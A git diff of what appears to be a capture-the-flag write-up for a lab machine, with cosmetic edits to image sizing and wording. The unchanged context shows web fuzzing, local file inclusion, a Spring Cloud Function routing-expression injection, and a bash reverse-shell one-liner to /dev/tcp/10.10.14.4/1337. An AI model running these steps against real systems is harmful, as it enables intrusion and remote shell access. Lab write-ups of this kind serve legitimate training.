@@ -44,11 +44,11 @@ http://10.10.11.204:8080/ [200 OK] Bootstrap, Content-Language[en-US], Country[R
 
 Browser:
 
-![](home.png)
+![](home.png){: width="70%" .normal}
 
-![](home_version.png)
+![](home_version.png){: width="70%" .normal}
 
-![](home_upload.png)
+![](home_upload.png){: width="70%" .normal}
 
 ## Initial foothold
 
@@ -88,11 +88,11 @@ $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 
 Try to upload a revshell (`revshell.sh`):
 
-![](images_only.png)
+![](images_only.png){: width="70%" .normal}
 
 `/release_notes` directory:
 
-![](release_notes.png)
+![](release_notes.png){: width="50%" .normal}
 
 Uploading an image gives us an `Uploaded! View your Image` message and the path of the uploaded image: `http://10.10.11.204:8080/show_image?img=logo.jpg`:
 
@@ -111,7 +111,7 @@ $ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://10.10.
 ...snip...
 ```
 
-Test findings:
+Manually check the above findings:
 
 ![](lfi_req_passwd.png)
 
@@ -161,9 +161,9 @@ def scan(txt,cmd):
 ```
 
 Things to note:
-- `'spring.cloud.function.routing-expression':payload`
-- `path = '/functionRouter'`
-- `req=requests.post`
+- Passing the payload through a specific header: `'spring.cloud.function.routing-expression':payload`
+- The path to send our request to: `path = '/functionRouter'`
+- The method of the request: `req=requests.post`
 
 ![](ping_test.png)
 
@@ -175,7 +175,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.204 - - [08/Feb/2024 18:13:10] "GET / HTTP/1.1" 200 -
 ```
 
-Sending a reverse shell does not work:
+Although the above check worked, sending a reverse shell does not work:
 
 ```bash
 "/bin/bash -i >& /dev/tcp/10.10.14.4/1337 0>&1"
